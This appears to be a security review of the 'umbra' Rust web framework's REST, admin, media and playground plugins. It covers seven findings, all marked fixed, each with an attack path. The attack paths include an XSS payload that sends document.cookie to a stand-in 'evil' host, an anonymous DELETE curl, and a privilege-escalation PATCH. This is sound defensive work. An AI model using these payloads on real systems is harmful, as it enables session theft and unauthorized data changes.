# Security — HTTP-facing plugins

> **Sweep status — 2026-06-14 (complete)**
> - **WEB-1 (fixed):** REST is now safe-by-default. Block-list extended to permissions/tasks/audit tables + boot warning (`20042bf`); the fallback permission is now `ReadOnly` not `AllowAny` (`2013af3`) — anonymous reads OK, writes 403 until opt-in via the new `RestPlugin::default_permission(...)`. PERF-1's row ceiling (`06f19df`) caps the same endpoint's payload.
> - **WEB-2 (fixed):** admin half — noform/noedit are write guards on admin POSTs (`73ef05d`); REST half — `hide()` now strips fields on create/update so a hidden column can't be written (`2013af3`).
> - **WEB-3 (fixed):** script-safe `tojson` (`4cf24e1`). **WEB-5 (fixed):** no raw DB error in 500 (`20042bf`). **WEB-7 (fixed):** permcheck on bulk-actions + FK pickers (`4cf24e1`).
> - **WEB-4 (fixed):** active-content uploads (`.html`/`.svg`/`.js`…) neutralised to inert `.txt` at store time (`a9f931d`). **WEB-6 (fixed):** playground no longer mounts in Prod without `allow_in_prod()` (`83701c0`).

Scope: `umbra-rest`, `umbra-admin`, `umbra-playground`, `umbra-openapi`, `umbra-media`, `umbra-static`, and the MiniJinja integration in `umbra-core`. This file holds the only **critical** in the review.

---

## WEB-1 — Insecure REST default: anonymous full CRUD on every model
> **✅ FIXED** (`20042bf`, `2013af3`) — block-list + boot warning, and ReadOnly is now the default permission (writes need opt-in).
**Severity: critical** · **Verified** (`lib.rs:188` falls back to `AllowAny`; `lib.rs:243` defaults `authentication` to `NoAuthentication`)

- **File:** `plugins/umbra-rest/src/lib.rs:184-188` (`permission_for` → `AllowAny`), `:243` (`NoAuthentication`), `:73`/`:693-710` (`allow` / `DEFAULT_BLOCKED_TABLES`)
- **Evidence:** `RestPlugin::default()` sets `authentication: NoAuthentication`; `permission_for()` returns `AllowAny` for any table without an explicit `.permission(...)`. `allow()` returns `true` for every table except `["auth_user", "session", "umbra_migrations"]`. So `gate()` → `AllowAny.check()` → `Ok(())` for List/Retrieve/Create/Update/Delete.
- **Attack path:** A developer adds `RestPlugin::default()` to get a read API (the documented happy path). With no further config, every business model (`order`, `product`, `invoice`, …) is open to anonymous `POST`/`PUT`/`PATCH`/`DELETE` from the internet. `curl -X DELETE https://app/api/order/1` succeeds with no auth.
- **Fix:** Default to a write-protecting permission (`ReadOnly` or `IsAuthenticated`); require explicit `.expose(...)` opt-in for write actions. At minimum, log a loud boot warning when a resource is mounted with `AllowAny + NoAuthentication`, and extend the block-list to the permissions and tasks tables. This is the highest-leverage fix in the review — see WEB-2, which it amplifies.

## WEB-2 — Mass assignment: dynamic writes strip `noform` but not `noedit`
> **✅ FIXED** (`73ef05d`, `2013af3`) — admin honors noform/noedit on write; REST `hide()` strips fields on create/update.
**Severity: high** · **Verified** (`crates/umbra-core/src/orm/dynamic.rs:1039` and `:1290` strip only `col.noform`; no `noedit` branch anywhere on the write path)

- **File:** `plugins/umbra-rest/src/lib.rs:1257-1317` (`create`/`update` → `insert_json`/`update_json`); `crates/umbra-core/src/orm/dynamic.rs:1016-1047`, `:1275-1298`
- **Evidence:** `create`/`update` pass the raw request body to `insert_json(&body)` / `update_json(&body)`. The ORM removes a key only when `col.noform` is set. `noedit` is **not** stripped on writes, and REST `hide()` filters only the **outbound** response (`apply_overrides`) — its own docs say "the column stays writable."
- **Attack path:** A custom user/profile model with `is_superuser` / `is_admin` / `balance` marked `#[umbra(noedit)]` (or REST-`hide()`d) but not `#[umbra(noform)]` is writable via `PATCH /api/profile/1 {"is_superuser": true}`. Combined with WEB-1, this is **unauthenticated privilege escalation**.
- **Fix:** Treat `noedit` as non-writable on the dynamic write path (strip it like `noform`); make REST `hide()` imply write-protection, or add an explicit per-resource writable allow-list. Document that hiding a field does not protect it on write.

## WEB-3 — Reflected XSS in the admin filter dialog (`</script>` breakout)
> **✅ FIXED** (`4cf24e1`) — `tojson` escapes `<`/`>`/`&` + line separators; regression test.
**Severity: high** · **Verified** (`engine.rs:42-45` `tojson` wraps `serde_json::to_string` in `Value::from_safe_string`; `filter_dialog.html:218` interpolates it into an inline `<script>`)

- **File:** `plugins/umbra-admin/templates/_macros/filter_dialog.html:218`, fed by `plugins/umbra-admin/src/handlers/list.rs:857-875`; values parsed in `plugins/umbra-admin/src/pagination.rs:89-110`; filter registered in `plugins/umbra-admin/src/engine.rs:42-45`
- **Evidence:** `m[{{ key | tojson }}] = {{ val | tojson }};` inside `<script>`. The admin's `tojson` does `serde_json::to_string(...)` and `Value::from_safe_string`, bypassing autoescape. `serde_json` doesn't escape `/` or `<`, so a value containing `</script>` is emitted verbatim. `active_filters` keys/values come from attacker-controllable `filter_<field>=<value>` query params with no value allow-list.
- **Attack path:** `GET /admin/<table>/filter-dialog?filter_x=</script><script>fetch('//evil/'+document.cookie)</script>`. A staff user opening a crafted admin link runs attacker JS in the admin origin (session theft, CSRF-token exfiltration, privileged actions).
- **Fix:** Use a script-context-safe encoder that escapes `<`, `>`, `&`, `/` (at least `</` → `<\/` and `<!--`), as Django's `json_script` does; or emit data in `<script type="application/json">` read via `JSON.parse(textContent)` instead of interpolating into executable JS.

## WEB-4 — Stored XSS via user-uploaded HTML/SVG served inline (umbra-media)
> **✅ FIXED** (`a9f931d`) — active-content uploads neutralised to inert `.txt` at store time.
**Severity: high**

- **File:** `plugins/umbra-media/src/lib.rs:131-178` (`save`), `:190-210` (`routes`/`ServeDir`)
- **Evidence:** `save` sanitizes only path separators/NUL and keeps the original extension (`<uuid>-<safe_name>`). No extension/MIME allow-list — the docstring says "The plugin doesn't verify." `ServeDir` sets `Content-Type` from the extension. `x-content-type-options: nosniff` is set, but that does not stop a `.html`/`.svg` file from being served as `text/html` / `image/svg+xml` and rendered inline (no `Content-Disposition: attachment`).
- **Attack path:** An app accepting uploads (avatars/attachments) that calls `MediaPlugin::save` without its own allow-list lets an attacker upload `x.html` with `<script>` or `x.svg` with inline script. Visiting `/<media>/<uuid>-x.html` runs script on the app origin → stored XSS.
- **Fix:** Ship a built-in extension/MIME allow-list (default images/docs); refuse `.html`/`.svg`/`.xhtml`/`.js` unless explicitly opted in; serve user uploads with `Content-Disposition: attachment` or from a separate cookieless origin. `save` should enforce the allow-list rather than delegating entirely to the caller.

## WEB-5 — Raw DB error text leaked in REST 500 responses
> **✅ FIXED** (`20042bf`) — DB errors logged server-side; generic message to the client.
**Severity: medium**

- **File:** `plugins/umbra-rest/src/lib.rs:1065-1069`
- **Evidence:** `ApiError::Sqlx(e) => (500, "database_error", e.to_string())` — the raw sqlx error string is placed in the JSON body in every environment.
- **Attack path:** A malformed request that trips a DB error returns column/constraint names and SQL fragments, aiding schema enumeration and SQLi probing.
- **Fix:** Return a generic message in prod, log detail server-side (as `umbra-admin/src/util.rs::sanitise_form_error` already does), gate any detail behind `Environment::Dev`.

## WEB-6 — API playground exposed unauthenticated, runs requests with the victim's cookies
> **✅ FIXED** (`83701c0`) — playground does not mount in Prod without `allow_in_prod()`.
**Severity: medium**

- **File:** `plugins/umbra-playground/src/routes.rs:130-148`, `plugins/umbra-playground/src/lib.rs:118-124`
- **Evidence:** The playground router mounts `/api/playground/` (shell + assets) with no `require_staff`/permission gate. It's an interactive request runner that calls the REST API from the browser using ambient cookies. (Injected `app_name`/spec URL are correctly escaped — no XSS there.)
- **Attack path:** If wired in production, anyone reaching `/api/playground/` gets a request console executing with whatever session cookie the visitor holds. Couples with WEB-1 to give an anonymous attacker a UI for the open API.
- **Fix:** Default the playground to dev-only or gate routes on `is_staff`; refuse to mount (or warn) under `Environment::Prod`.

## WEB-7 — Admin bulk-actions and FK-autocomplete skip object/model permission checks
> **✅ FIXED** (`4cf24e1`) — permcheck on bulk-actions (run + dispatch) and FK pickers.
**Severity: medium**

- **File:** `plugins/umbra-admin/src/handlers/actions.rs:116-236` (`dispatch_action`), `plugins/umbra-admin/src/handlers/fk_picker.rs:35` (`fk_options`)
- **Evidence:** Both call `require_staff` but not `crate::permcheck::require(...)` — unlike every CRUD handler (permcheck appears in crud/list/sheet/inline_edit but not actions/fk_picker). `dispatch_action` runs developer-defined bulk actions (can mutate/delete); `fk_options` returns rows of any model.
- **Attack path:** With `umbra-permissions` installed, a staff user lacking `change_<model>`/`delete_<model>` can still trigger bulk actions, and can enumerate any model's rows via FK-autocomplete regardless of `view` permission.
- **Fix:** Add `permcheck::require` (Change/Delete for the action, View for `fk_options`) before dispatch.

## Lower-severity notes
- **No CSRF on REST mutations** (`plugins/umbra-rest/`): token-auth APIs don't need it, but a developer wiring session-cookie auth for REST (plausible — the session plugin is shared) makes all `POST/PUT/PATCH/DELETE` CSRF-able. Document that cookie-authenticated REST resources need CSRF or `SameSite` enforcement.
- **`Content-Disposition` filename in admin downloads** (`actions.rs:215`) interpolates the action-supplied filename unescaped — developer-controlled, low risk, but a `"`/newline breaks the header. Quote/sanitize.

## Done well
- Template autoescaping on by default for `.html`/`.htm` in both engines (`crates/umbra-core/src/templates.rs:277-283`, `engine.rs:20`); no `| safe` anywhere in admin templates.
- The `img` filter HTML-escapes every attribute value (`templates.rs:138-198`).
- Open-redirect protection on admin `?next=` (`auth.rs:247-291`) rejects `//`, `://`, non-admin paths, with tests.
- Path traversal structurally handled (embedded mode is an in-memory tree walk; Fs/media use `tower_http::ServeDir`, which rejects `..`; media filename strips `/`, `\`, `\0`).
- OpenAPI documents only REST-exposed models (gates on `umbra_rest::is_exposed`); dev-only endpoint hints gated to `Environment::Dev`.
- Sensitive built-ins (`auth_user`, `session`, `umbra_migrations`) blocked from REST by default. Admin login is timing-safe.
